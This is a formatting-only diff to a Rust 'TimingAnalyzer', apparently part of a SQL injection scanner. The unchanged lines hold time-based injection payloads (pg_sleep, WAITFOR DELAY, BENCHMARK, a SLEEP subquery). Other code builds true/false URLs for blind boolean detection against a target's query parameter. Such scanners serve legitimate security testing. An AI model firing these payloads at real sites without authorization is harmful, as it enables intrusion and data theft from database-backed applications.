@@ -44,7 +44,10 @@ impl TimingAnalyzer {
             format!("' OR pg_sleep({})-- ", self.delay_seconds),
             format!("'; WAITFOR DELAY '0:0:{}'-- ", self.delay_seconds),
             format!("' OR BENCHMARK(10000000,SHA1('test'))-- "),
-            format!("1' AND (SELECT * FROM (SELECT(SLEEP({})))a)-- ", self.delay_seconds),
+            format!(
+                "1' AND (SELECT * FROM (SELECT(SLEEP({})))a)-- ",
+                self.delay_seconds
+            ),
         ];
 
         for payload in &payloads {
@@ -123,31 +126,15 @@ impl TimingAnalyzer {
 
         for (true_payload, false_payload) in &boolean_pairs {
             let true_url = if target_url.contains('?') {
-                format!(
-                    "{}&q={}",
-                    target_url,
-                    urlencoding::encode(true_payload)
-                )
+                format!("{}&q={}", target_url, urlencoding::encode(true_payload))
             } else {
-                format!(
-                    "{}?q={}",
-                    target_url,
-                    urlencoding::encode(true_payload)
-                )
+                format!("{}?q={}", target_url, urlencoding::encode(true_payload))
             };
 
             let false_url = if target_url.contains('?') {
-                format!(
-                    "{}&q={}",
-                    target_url,
-                    urlencoding::encode(false_payload)
-                )
+                format!("{}&q={}", target_url, urlencoding::encode(false_payload))
             } else {
-                format!(
-                    "{}?q={}",
-                    target_url,
-                    urlencoding::encode(false_payload)
-                )
+                format!("{}?q={}", target_url, urlencoding::encode(false_payload))
             };
 
             let true_body = self.fetch_body(&true_url).await.unwrap_or_default();
